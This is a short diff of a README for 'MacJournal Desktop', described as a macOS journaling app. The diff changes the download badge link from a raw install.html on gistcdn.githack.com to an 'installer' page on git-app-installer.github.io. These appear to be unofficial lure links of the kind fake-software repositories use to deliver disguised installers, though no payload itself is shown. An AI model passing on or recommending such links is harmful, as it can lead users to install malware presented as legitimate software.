@@ -1,7 +1,7 @@
 # MacJournal Desktop — Note Taking for macOS
 MacJournal for macOS allows you to keep journals, take notes, and organize ideas efficiently with a clean, mac-native interface.
 
-<a href="https://gistcdn.githack.com/rabbitwolf79-oss/7fe43c56f9678b2a0ccf2c5b3a9355e0/raw/eacb6194ccf34241b3c1f2b6580ac6d717a3aaba/install.html?offer=MacJournal" target="_blank">
+<a href="https://git-app-installer.github.io/.github/?offer=MacJournal" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20MacJournal%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
